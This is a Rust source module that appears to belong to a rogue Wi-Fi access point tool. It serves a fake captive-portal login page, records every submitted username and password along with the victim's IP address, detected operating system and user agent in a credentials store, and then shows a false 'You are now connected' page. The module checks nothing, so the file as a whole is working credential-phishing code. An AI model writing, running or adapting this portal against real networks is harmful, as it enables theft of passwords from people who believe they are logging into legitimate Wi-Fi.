//! Captive portal support with Tera dynamic templates.

use std::collections::HashMap;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::{atomic::{AtomicBool, Ordering}, Mutex, OnceLock};
use std::thread;
use tera::{Tera, Context};

#[derive(Clone)]
pub struct PortalConfig {
    pub template_dir: String,
    pub log_path: String,
    pub portal_ip: String,
    pub portal_port: u16,
    pub fallback_port: u16,
}

impl Default for PortalConfig {
    fn default() -> Self {
        PortalConfig {
            template_dir: std::env::var("AP1_PORTAL_TEMPLATE_DIR")
                .unwrap_or_else(|_| "../config/templates".to_string()),
            log_path: std::env::var("AP1_PORTAL_LOG")
                .unwrap_or_else(|_| "../system/runtime/portal_credentials.log".to_string()),
            portal_ip: std::env::var("AP1_PORTAL_IP").unwrap_or_else(|_| "192.168.50.1".to_string()),
            portal_port: std::env::var("AP1_PORTAL_PORT")
                .ok()
                .and_then(|v| v.parse().ok())
                .unwrap_or(80),
            fallback_port: std::env::var("AP1_PORTAL_FALLBACK_PORT")
                .ok()
                .and_then(|v| v.parse().ok())
                .unwrap_or(8000),
        }
    }
}

struct PortalState {
    running: AtomicBool,
    thread: Mutex<Option<thread::JoinHandle<()>>>,
    tera: OnceLock<Tera>,
}

static PORTAL_STATE: OnceLock<PortalState> = OnceLock::new();

fn portal_state() -> &'static PortalState {
    PORTAL_STATE.get_or_init(|| PortalState {
        running: AtomicBool::new(false),
        thread: Mutex::new(None),
        tera: OnceLock::new(),
    })
}

fn get_tera(template_dir: &str) -> &Tera {
    portal_state().tera.get_or_init(|| {
        let path = format!("{}/**/*.html", template_dir);
        match Tera::new(&path) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("Tera construction error: {}", e);
                Tera::default()
            }
        }
    })
}

fn build_response(body: &str) -> String {
    format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        body.len(),
        body
    )
}

fn render_page(template_name: &str, cfg: &PortalConfig, context_data: HashMap<&str, String>) -> String {
    let tera = get_tera(&cfg.template_dir);
    let mut context = Context::new();
    for (k, v) in context_data {
        context.insert(k, &v);
    }
    context.insert("portal_ip", &cfg.portal_ip);

    match tera.render(template_name, &context) {
        Ok(s) => build_response(&s),
        Err(_) => {
            // Fallback to basic HTML if template not found
            if template_name.contains("login") {
                login_page_fallback(&cfg.portal_ip)
            } else {
                success_page_fallback()
            }
        }
    }
}

fn login_page_fallback(ip: &str) -> String {
    let body = format!(r#"<!DOCTYPE html><html><body><h1>AP1 Login</h1><form method='POST' action='/login'>
        User: <input name='login'><br>Pass: <input type='password' name='password'><br>
        <button type='submit'>Login</button></form></body></html>"#);
    build_response(&body)
}

fn success_page_fallback() -> String {
    build_response("<!DOCTYPE html><html><body><h1>Success</h1><p>You are now connected.</p></body></html>")
}

fn decode_url_component(component: &str) -> String {
    let mut output = String::with_capacity(component.len());
    let mut bytes = component.as_bytes().iter();
    while let Some(&b) = bytes.next() {
        match b {
            b'+' => output.push(' '),
            b'%' => {
                let hi = bytes.next().copied().unwrap_or(b'0');
                let lo = bytes.next().copied().unwrap_or(b'0');
                let hex = [hi, lo];
                if let Ok(value) = u8::from_str_radix(std::str::from_utf8(&hex).unwrap_or("00"), 16) {
                    output.push(value as char);
                }
            }
            _ => output.push(b as char),
        }
    }
    output
}

fn parse_form(body: &str) -> HashMap<String, String> {
    body.split('&')
        .filter_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
                let key = decode_url_component(key);
                let value = decode_url_component(value);
                Some((key, value))
            } else {
                None
            }
        })
        .collect()
}

fn detect_os(user_agent: &str) -> String {
    let ua = user_agent.to_lowercase();
    if ua.contains("iphone") || ua.contains("ipad") { "iOS".to_string() }
    else if ua.contains("android") { "Android".to_string() }
    else if ua.contains("windows") { "Windows".to_string() }
    else if ua.contains("macintosh") { "macOS".to_string() }
    else { "Linux".to_string() }
}

fn handle_connection(mut stream: TcpStream, cfg: PortalConfig) {
    let mut buffer = [0; 8192];
    if let Ok(size) = stream.read(&mut buffer) {
        let request = String::from_utf8_lossy(&buffer[..size]);
        let lines: Vec<&str> = request.lines().collect();
        let request_line = lines.get(0).unwrap_or(&"");
        let mut parts = request_line.split_whitespace();
        let method = parts.next().unwrap_or_default();
        let path = parts.next().unwrap_or_default();

        let mut user_agent = "Unknown".to_string();
        for line in &lines {
            if line.to_lowercase().starts_with("user-agent:") {
                user_agent = line[11..].trim().to_string();
                break;
            }
        }
        let os = detect_os(&user_agent);
        let client_ip = stream.peer_addr().map(|a| a.ip().to_string()).unwrap_or_else(|_| "unknown".to_string());

        let mut context = HashMap::new();
        context.insert("os", os.clone());
        context.insert("client_ip", client_ip.clone());

        if method == "POST" && path == "/login" {
            let body = request.split("\r\n\r\n").nth(1).unwrap_or_default();
            let values = parse_form(body);
            let login = values.get("login").or(values.get("username")).cloned().unwrap_or_default();
            let password = values.get("password").cloned().unwrap_or_default();

            crate::database::save_credential(&login, &password, &client_ip, &os, &user_agent);

            let response = render_page("login_successful.html", &cfg, context);
            let _ = stream.write_all(response.as_bytes());
        } else {
            let response = render_page("login.html", &cfg, context);
            let _ = stream.write_all(response.as_bytes());
        }
    }
}

pub fn start_portal_with_config(cfg: PortalConfig) {
    let state = portal_state();
    if state.running.load(Ordering::SeqCst) { return; }

    state.running.store(true, Ordering::SeqCst);
    let bind_addr = format!("0.0.0.0:{}", cfg.portal_port);
    if let Ok(listener) = TcpListener::bind(&bind_addr) {
        let inner_cfg = cfg.clone();
        let handle = thread::spawn(move || {
            for stream in listener.incoming() {
                if !portal_state().running.load(Ordering::SeqCst) { break; }
                if let Ok(stream) = stream {
                    let cfg_clone = inner_cfg.clone();
                    thread::spawn(move || handle_connection(stream, cfg_clone));
                }
            }
        });
        *state.thread.lock().unwrap() = Some(handle);
    }
}

pub fn stop_portal() {
    let state = portal_state();
    state.running.store(false, Ordering::SeqCst);
    if let Some(handle) = state.thread.lock().unwrap().take() {
        let _ = handle.join();
    }
}

pub fn is_running() -> bool {
    portal_state().running.load(Ordering::SeqCst)
}

pub fn read_credentials() -> Vec<String> {
    // Legacy support: read from file if needed, but usually we use DB now
    Vec::new()
}
